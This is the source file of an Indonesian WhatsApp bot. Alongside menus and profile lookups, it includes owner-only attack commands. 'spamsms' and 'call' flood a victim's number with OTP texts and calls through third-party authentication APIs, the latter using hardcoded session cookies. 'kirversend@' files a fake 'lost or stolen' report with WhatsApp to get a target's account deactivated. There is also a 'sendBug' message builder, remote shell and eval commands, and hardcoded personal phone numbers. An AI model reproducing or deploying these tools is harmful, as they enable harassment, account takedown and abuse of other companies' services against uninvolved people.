require(`./config.js`)

const { baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, prepareWAMessageMedia } = require("@adiwajshing/baileys")

const { getGroupAdmins, fetchJson, reSize } = require("./functions.js")

const { exec, spawn, execSync } = require("child_process")

const cheerio = require("cheerio")

const chalk = require("chalk")

const util = require("util")

const axios = require("axios")

const fs = require("fs")

const syntaxerror = require('syntax-error')

const Jimp = require("jimp")

const PhoneNumber = require('awesome-phonenumber')

const owner = JSON.parse(fs.readFileSync('./owner.json'))

const register = JSON.parse(fs.readFileSync('./user.json'))

const audionya = fs.readFileSync('./music.mp3')

module.exports = async (client, mek, msg, store) => {

try {

const type = getContentType(msg.message)

const content = JSON.stringify(msg.message)

const from = msg.key.remoteJid

const quoted = type == 'extendedTextMessage' && msg.message.extendedTextMessage.contextInfo != null ? msg.message.extendedTextMessage.contextInfo.quotedMessage || [] : []

const body = (type === 'conversation' && msg.message.conversation) ? msg.message.conversation : (type == 'imageMessage') && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : (type == 'documentMessage') && msg.message.documentMessage.caption ? msg.message.documentMessage.caption : (type == 'videoMessage') && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : (type == 'extendedTextMessage') && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : (type == 'buttonsResponseMessage' && msg.message.buttonsResponseMessage.selectedButtonId) ? msg.message.buttonsResponseMessage.selectedButtonId : (type == 'templateButtonReplyMessage') && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : ''

const budy = (typeof msg.text == 'string' ? msg.text : '')

const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα~¦|/\\©^]/gi) : '.'

const isCmd = body.startsWith(prefix)

const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''

const args = body.trim().split(/ +/).slice(1)

const text = q = args.join(" ")

const isGroup = from.endsWith('@g.us')

const botNumber = client.user.id.split(':')[0]

const sender = msg.key.fromMe ? (client.user.id.split(':')[0]+'@s.whatsapp.net' || client.user.id) : (msg.key.participant || msg.key.remoteJid)

const senderNumber = sender.split('@')[0]

const pushname = msg.pushName || `${senderNumber}`

const isBot = botNumber.includes(senderNumber)

const isOwner = owner.includes(senderNumber) || isBot

const isRegister = register.includes(sender)

const getBuffer = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "get",
			url,
			headers: {
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}

let ss = await getBuffer(`https://telegra.ph/file/6e85270a45fe1847de2fb.jpg`)

const sendBug = async (target) => {
client.sendMessage(target + "@s.whatsapp.net", {
text: '', 
templateButtons: [
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6287705048235`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6287705048235`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6287705048235`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6287705048235`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ callButton: { displayText: `Number Phone Owner`, phoneNumber: `6287705048235`}},
{ urlButton: { displayText: `OWNER`, url: `https://wa.me/6287705048235`}},
{ urlButton: { displayText: `ID GORUP`, url: `https://www.whatsapp.com/otp/copy/${from}`}},
{ quickReplyButton: { displayText: `ʀᴜʟᴇs`, id: `${prefix}rules`}},
{ quickReplyButton: { displayText: `ɪɴғᴏ ʙᴏᴛᴢ`, id: `${prefix}x`}},
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa`}}]}
)
}

function eror() {

let crtr = owner[0] + "@s.whatsapp.net"

client.sendMessage(from, { text : `Maaf Terjadinya Error Kak Harap Lapor Ke @${crtr.split("@")[0]}`, mentions: [crtr] }, { quoted : msg })

}

const pw = [
"165310", 
  "177978", 
    "211759",  
      "212643", 
        "229540", 
          "111074",
            "211519", 
              "256097", 
                "163478", 
                  "915005", 
                    "792880", 
                      "260629", 
                        "128051", 
                          "239536",
                            "121310",
                              "202019",
                                "250029"
]

const kodedaftar = pw[Math.floor(Math.random() * pw.length)]

const parseMention = (text = '') => {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

const makeid = (length) => {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
  result += characters.charAt(Math.floor(Math.random() *
  charactersLength));
    }
    return result
}

const reply = (teks) => {

client.sendMessage(from, { text : teks }, { quoted : msg })

}

if (isCmd && msg.isGroup) { 

console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Group Chat"), chalk.bold('[' + args.length + ']')); 

}

if (isCmd && !msg.isGroup) { 

console.log(chalk.bold.rgb(255, 178, 102)('\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mCMD\x1b[1;37m]'), chalk.bold.rgb(153, 255, 153)(command), chalk.bold.rgb(204, 204, 0)("from"), chalk.bold.rgb(153, 255, 204)(pushname), chalk.bold.rgb(204, 204, 0)("in"), chalk.bold.rgb(255, 178, 102)("Private Chat"), chalk.bold('[' + args.length + ']')); 

}

try {
ppuser = await client.profilePictureUrl(sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}

let list = []
for (let i of owner) {
list.push({
displayName: await client.getName(i + '@s.whatsapp.net'),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await client.getName(i + '@s.whatsapp.net')}\n
FN:${await client.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:tesheroku123@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://bit.ly/39Ivus6\n
item3.X-ABLabel:YouTube\n
item4.ADR:;;Indonesia;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}

function khususOwner() {
reply("Kamu Siapa? Owner Ku Bukan Kalau Bukan Jangan Gunain Command Ini Ya")
}

function sudahdaftar() {
reply(`Kamu Sudah Terdaftar Sebelumnya!`)
}

function kirver() {
const buttonsDefault = [
{ quickReplyButton: { displayText: `DAFTAR`, id : '.daftar'}}
]                 
const buttonMessage = { 
text: `Hallo Kak *${msg.pushName}*, Sepertinya Kakak Belum Terdaftar Di Database Bot`, 
footer: "Silahkan Pencet Button Di Bawah Untuk Daftar!", 
templateButtons: buttonsDefault, 
image: {url: ppuser}                                   
}
return client.sendMessage(from, buttonMessage)
}

let kodenya = kodedaftar

async function replyT(nosend) {
const buttonsDefault = [{ urlButton: { displayText: `COPY DISINI`, url: `https://www.whatsapp.com/otp/copy/${kodenya}`}}]                 
const buttonMessage = { 
text: `Kode Verifikasi Anda Adalah ${kodenya}`, 
footer: "Kamu Bisa Copy Kodenya Di Bawah Dan Kode Ini Tidak Bisa Di Gunakan Di Dalam Chat Group, Kode Akan Expired Dalam Waktu 1 Menit", 
templateButtons: buttonsDefault, 
image: {url: ppuser}                                   
}
return client.sendMessage(nosend, buttonMessage)
}

if (/165310|177978|211759|212643|229540|111074|211519|256097|163478|915005|792880|260629|128051|239536|121310|202019|250029/g.test(body)) {
if (isGroup) return 
if (isRegister) return sudahdaftar()
register.push(sender)
fs.writeFileSync('./user.json', JSON.stringify(register))
let nihh = `*Pendaftaran berhasil*
Nama: ${msg.pushName}
Tag: @${sender.split("@")[0]}

Total Pengguna Bot: ${register.length}

Terimakasih Telah Mendaftar Ke Database bot`
client.sendMessage(from, { image: await getBuffer(ppuser), caption: nihh, mentions: parseMention(nihh) }, { quoted: msg })
}

const butImgNye = [
{buttonId: `${prefix}listmenu`, buttonText: {displayText: '𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨'}, type: 1},
{buttonId: `${prefix}owner`, buttonText: {displayText: '𝗢𝗪𝗡𝗘𝗥'}, type: 1},
{buttonId: `${prefix}donasi`, buttonText: {displayText: '𝗗𝗢𝗡𝗔𝗦𝗜'}, type: 1}
]

const meki = await getBuffer(ppuser)

let kirown = "6287705048235@s.whatsapp.net"
let dinown = "6281545463585@s.whatsapp.net"
let ferown = "6281279890571@s.whatsapp.net"
let manzown = "6285731389178@s.whatsapp.net"
let nazeown = "6282113821188@s.whatsapp.net"
let danown = "6281356484612@s.whatsapp.net"

const buttonImgnya = {
image: meki, 
caption: `Hai kak @${sender.split("@")[0]}
Aku Adalah Bot WhatsApp Jika Ada Bug/Error Bisa Lapor Owner.

Nama ${isOwner ? 'Creator' : 'User'} : ${msg.pushName}
Nomor ${isOwner ? 'Creator' : 'User'} : ${sender.split("@")[0]}
Status Pengguna : ${isOwner ? 'Creator' : 'User'}
Total User Bot : ${register.length} User

*Script By Valkyrie X4 Team*
*Anggota Team ↓*
*KirBotz ->* @${kirown.split("@")[0]}
*Didin ->* @${dinown.split("@")[0]}
*Ferdi ->* @${ferown.split("@")[0]}
*Manz ->* @${manzown.split("@")[0]}
*Naze ->* @${nazeown.split("@")[0]}
*Danta ->* @${danown.split("@")[0]}`,
mentions : [sender, kirown, dinown, ferown, manzown, nazeown, danown],
fileLength: "1",
footer: `Bot By Valkyrie X4 Team`,
buttons: butImgNye,
headerType: 4
}

if (/hai/g.test(body)) {
let reactionMessage = proto.Message.ReactionMessage.create({ key: msg.key, text: "" })
client.relayMessage(from, { reactionMessage }, { messageId: "ppppp" })
}

switch (command) {

case "verify": case "verifikasi": case "daftar": case "verif": {
if (isRegister) return sudahdaftar()
replyT(sender)
reply(`Kode Verifikasi Anda Sudah Di Kirim Lewat Pribadi Chat Oleh Bot WhatsApp Silahkan Cek 🙏`)
}
break

case "call":
if (!isRegister) return kirver()
if (!isOwner) return khususOwner()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6285798145596`)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+6287705048235`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${nosend}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

case "spamsms": {
if (!isRegister) return kirver()
if (!isOwner) return khususOwner()
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} +6285798145596`)
let nosend = "+" + q.split("|")[0].replace(/[^0-9]/g, '')
if (args[0].startsWith(`+6287705048235`)) return reply('Tidak bisa spam sms ke nomor ini!')
let mal = [ "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v7108827108815046027 t6205049005192687891", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1692361810532096513 t9071033982482470646", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v4466439914708508420 t8068951106021062059", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v8880767681151577953 t8052286838287810618", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 RuxitSynthetic/1.0 v6215776200348075665 t6662866128547677118", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v1588190262877692089 t2919217341348717815", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 RuxitSynthetic/1.0 v5330150654511677032 t9071033982482470646", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36", "Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36" ]
let ua = mal[Math.floor(Math.random() * mal.length)];
let axios = require('axios').default;
let hd = {
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
};
const dat = {
'phone': nosend
};
for (let x = 0; x < 2; x++) {
axios.post('https://api.myfave.com/api/fave/v3/auth', dat, {
headers: hd
})
.then(res => {
console.log(res);
})
.catch(err => {
console.log(`[${new Date().toLocaleTimeString()}] Spam (SMS) IVI Gagal abang jago`);
});
}
}
break

case "ai": {
if (!isRegister) return kirver()
if (!text) return reply(`Yah Ada Yang Bisa Saya Bantu?\nExample: .ai Apakah itu bot.`)
const ChatGPTRequest = async (text) => {
const result = {
success: false,
data: "Aku gak tau",
message: "",
}
return await axios({
method: 'post',
url: 'https://api.openai.com/v1/completions',
data: {
model: "text-davinci-003",
prompt: text,
max_tokens: 1000,
temperature: 0
},
headers: {
"accept": "application/json",
"Content-Type": "application/json",
"Accept-Language": "in-ID",
"Authorization": `Bearer ${keyai}`,
},
})
.then((response) => {
if (response.status == 200) {
const { choices } = response.data;
if (choices && choices.length) {
result.success = true;
result.data = choices[0].text;
}
} else {
result.message = "Failed response";
}
return result;
})
.catch((error) => {
result.message = "Error : " + error.message;
return result;
});
}
const response = await ChatGPTRequest(text)
if (!response.success) {
return reply(response.message);
}
return reply(response.data);
}
break

case "ffstalk":{
if (!isRegister) return kirver()
if (!q) return reply(`Contoh ${prefix+command} 946716486`)
let eeh = await ffstalk(`${q}`)
reply(`*/ Stalking Freefire \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break

case "mlstalk": {
if (!isRegister) return kirver()
if (!q) return reply(`Contoh ${prefix+command} 530793138|8129`)
let dat = await mlstalk(q.split("|")[0], q.split("|")[1])
reply(`*/ Stalking Mobile Legend \\*

Username : ${dat.userName}
Id : ${q.split("|")[0]}
Zoneid : ${q.split("|")[1]}`)
}
break

case "npmstalk":{
if (!isRegister) return kirver()
if (!q) return reply(`Contoh ${prefix+command} kirbotz-api`)
let eha = await npmstalk(q)
reply(`*/ Stalking Npm \\*

Nama : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break

case "githubstalk":{
if (!isRegister) return kirver()
if (!q) return reply(`Contoh ${prefix+command} KirBotz`)
let aj = await githubstalk(`${q}`)
client.sendMessage(from, { image: { url : aj.profile_pic }, caption: 
`*/ Stalking Github \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: msg } )
}
break

case "owner":{
if (!isRegister) return kirver()
const repf = await client.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }}, { quoted: msg })
client.sendMessage(from,{text:`Hai Kak @${sender.split("@")[0]}, Itu Owner Ku Jangan Macam-macam Ya Btw Dia Cowok Kok Jomblo Lagi Wkwk😂`,mentions:[sender]},{quoted:repf})
}
break

case "donasi": case "donate":{
if (!isRegister) return kirver()
client.sendMessage(from,{image:ss, caption:`Hai Kak @${sender.split("@")[0]} Mau ${command}?

Silahkan Scan Qris All Payment Di Atas Ya Kak
Atau Juga Bisa Isi Nomor Payment Di Bawah Ya
Gopay : ${gopayno}
Ovo : ${ovono}
Dana : ${danano}
Shopeepay : ${shopeepayno}

Makasih Yang Udah ${command} Semoga Rezeki Nya Di Limpahkan Sama Allah SWT.`, mentions: [sender]},{quoted:msg})
}
break

case "menu": {
if (!isRegister) return kirver()
return client.sendMessage(from, buttonImgnya, { quoted : msg })
}
break

case "$":
if (!isRegister) return kirver()
if (!isOwner) return khususOwner()
try {
exec(args.join(" "), function(er, st) {
if (er) client.sendMessage(from, {
text: util.format(er.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
}, {
quoted: msg
})
if (st) client.sendMessage(from, {
text: util.format(st.toString().replace(/[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]/g, ''))
}, {
quoted: msg
})
})
} catch (e) {
console.warn(e)
}
break

case ">":
case "=>":
if (!isRegister) return kirver()
if (!isOwner) return khususOwner()
var err = new TypeError;
err.name = "EvalError "
err.message = "Code Not Found (404)"
if (!q) return reply(util.format(err))
var arg = command == ">" ? args.join(" ") : "return " + args.join(" ")
try {
var txtes = util.format(await eval(`(async()=>{ ${arg} })()`))
reply(txtes)
} catch(e) {
let _syntax = ""
let _err = util.format(e)
let err = syntaxerror(arg, "EvalError", {
allowReturnOutsideFunction: true,
allowAwaitOutsideFunction: true,
sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
reply(util.format(_syntax + _err))
}
break

case "kirversend@": {
if (!isRegister) return kirver()
if (!isOwner) return khususOwner()
if (!q) return reply("Nomor Nya?")
trget = `+` + q.split("|")[0].replace(/[^0-9]/g, '')
reply(`Otw Verif ` + trget)
let axioss = require("axios")  
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
const cheerio = require('cheerio');
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", trget)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
  cookie
}
})
client.sendMessage(from, { text: util.format(res.data)}, { quoted: msg })
}
break

case "cleardbuser":{
if (!isRegister) return kirver()
if (!isOwner) return khususOwner()
const clearAllList = (_dir) => {
    Object.keys(_dir).forEach((i) => {
        _dir.splice(_dir[i], 1)
        fs.writeFileSync('./user.json', JSON.stringify(_dir, null, 3))
    })
    reply("sukses")
}
return clearAllList(register)
}
break

case "allmenu": case "listmenu": {
if (!isRegister) return kirver()
let zxcgrj = require(`./quotes.json`)
var mxbfj = zxcgrj[Math.floor(Math.random() * zxcgrj.length)]
let udin = await client.sendMessage(from, { 
document: meki, 
jpegThumbnail: await reSize (meki, 300, 300),
fileName: `Created By KirBotz`,
mimetype: `application/text`,
caption: `Hallo Kak @${sender.split("@")[0]}, Berikut List Fitur Bot Di Bawah Ya Kak Jangan Spam!

*Owner Menu*
${txx}${prefix}kirversend@ <nomor>
${prefix}spamsms <nomor>
${prefix}call <nomor>
${prefix}cleardbuser
${prefix}$
${prefix}>
${prefix}=>${txx}

*Stalker Menu*
${txx}${prefix}ffstalk <id>
${prefix}mlstalk <id|zoneid>
${prefix}npmstalk <username>
${prefix}githubstalk <username>${txx}

*Other Menu*
${txx}${prefix}donasi
${prefix}ai <query>${txx}

Quotes Harian: *${mxbfj.quotes}*`,
mentions: [sender] },{ quoted: msg })
client.sendMessage(from, { audio: audionya, mimetype: 'audio/mp4', seconds: 999999999, ptt: true, mentions: [sender]}, { quoted: udin })
}
break

default:
}
} catch (err) {
console.log(util.format(err))
let e = String(err)
client.sendMessage("6287705048235@s.whatsapp.net", {text:e})
}
}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})